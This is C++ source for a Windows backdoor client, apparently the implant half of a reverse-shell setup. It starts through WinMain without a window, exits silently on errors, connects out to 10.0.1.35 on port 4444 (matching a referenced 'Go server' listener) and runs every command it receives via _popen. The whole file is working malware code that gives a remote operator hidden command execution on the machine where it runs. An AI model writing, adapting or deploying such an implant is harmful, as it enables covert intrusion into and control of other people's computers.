#include <iostream>
#include <string>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

// Function to execute the command and capture its output
void executeCommand(const string& command) {
    char buffer[128];
    FILE* fp = _popen(command.c_str(), "r");
    if (fp == NULL) {
        return; // If execution fails, return silently
    }
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        // You can process the command output here if needed
    }
    _pclose(fp);
}

// The entry point for the application. This is used in place of `main()`
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char server_reply[2000];

    // Initialize WinSock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1; // If failed to initialize Winsock, exit silently
    }

    // Create socket
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) {
        return 1; // If socket creation fails, exit silently
    }

    // Define the server address (change this to the server's IP and port)
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);  // Use the same LPORT as in Go server
    server.sin_addr.s_addr = inet_addr("10.0.1.35");  // Use the LHOST from Go server

    // Connect to the server
    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        return 1; // If connection fails, exit silently
    }

    // Receive and execute commands from the server
    while (true) {
        int recv_size = recv(s, server_reply, sizeof(server_reply) - 1, 0);
        if (recv_size == SOCKET_ERROR) {
            break; // If receiving data fails, break the loop and exit
        }
        server_reply[recv_size] = '\0';

        string command(server_reply);
        command = command.substr(0, command.find("\n"));  // Clean up input command

        // Execute the command
        executeCommand(command);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
